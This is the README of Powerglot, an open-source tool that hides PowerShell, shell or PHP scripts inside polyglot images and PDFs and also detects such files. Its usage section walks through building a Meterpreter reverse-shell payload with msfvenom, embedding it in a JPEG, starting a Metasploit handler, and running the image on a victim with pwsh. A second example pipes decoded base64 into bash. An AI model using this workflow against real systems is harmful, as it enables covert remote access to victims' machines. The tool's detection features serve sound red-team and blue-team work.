# Powerglot

Powerglot encodes several kind of scripts using polyglots, for example, offensive powershell scripts. It is not needed a loader to run the payload.

In red-team exercises or offensive tasks, masking of payloads is usually done by using steganography, especially to avoid network level protections, being one of the most common payloads scripts developed in powershell. Recent malware and APTs make use of some of these capabilities: APT32, APT37, Ursnif, Powload, LightNeuron/Turla, Platinum APT, Waterbug/Turla, Lokibot, The dukes (operation Ghost), Titanium, etc.

Powerglot is a multifunctional attack and defense tool based on polyglots. Powerglot allows to mask a script (powershell, shellscripting, php, ...) mainly in a digital image, although other file formats are in progress. Unlike the usual offensive tools or malware, Powerglot does not need any loader to execute the "information hidden", minimizing the noise on the target system.

PowerGlot has a clear utility in offensive tasks but it is also defined as a discovery and blue team tool. To our knowledge, it is the first general and complete open-source tool that allows to search for the presence of masked information with polyglots, information that could be useful to achieve persistence in a system or to hide malware (stego-malware, privilege escalation, lateral movement, reverse shell, etc.)

Features:
- Encode powershell/shell script/php/.. in a polyglot image. It is not necessay a loader to recover/execute the hidden information (payload). PowerGlot works with several formats. Mainly, JPEG format.

- Powerglot is a complete open-source tool to detect (malicious) polyglots, specially the result of some public tools as Truepolyglot or stegoSploit. We works in several formats: JPEG, PNG, GIF, BMP, ZIP, PDF, MP3, etc.


# Installation

# Usage & Parameters

```
# SERVER
# Prepare the payload and configure the server to receive a meterpreter connection

# msfvenom --payload windows/x64/meterpreter_reverse_http --format psh --out meterpreter.ps1 LHOST=<IP> LPORT=<PORT>
# python3 powerglot.py -o meterpreter.ps1 cat.jpg cat-o.jpg
# Check correct JPEG format
  #file cat-o.jpg
  # feh cat-o.jpg

msf > use exploit/multi/handler msf exploit(multi/handler) > set payload windows/meterpreter_reverse_http payload => windows/meterpreter_reverse_http msf exploit(multi/handler) > set lhost <IP> lhost => <IP> msf exploit(multi/handler) > set lport <PORT> lport => <PORT> msf exploit(multi/handler) > exploit

# LINUX VICTIM
# Download cat-o.jpg
# Execute 
# pwsh cat-o.jpg or cat cat-o.jpg | pwsd
```

```
# Polyglot in PDF
#base64 payload.sh (example linenum.sh)
#Create script.sh
echo "fasdfafdafdf=" | base64 .d | bash

#python3 powerglot -o script.sh file.pdf file-1.pdf
```



# Future work. Doing
- We are working to support different file formats for encoding information in polyglots. Currently, we support several techniques in JPEG and PDF.
- We are working to incorporate rules for the detection of polyglots in different formats. Currently, the presence of StegoSploit in JPEG files is detected.

# Author & license

This project has been developed by Dr. Alfonso Muñoz and Abraham Pasamar. The code is released under the GNU General Public License v3.


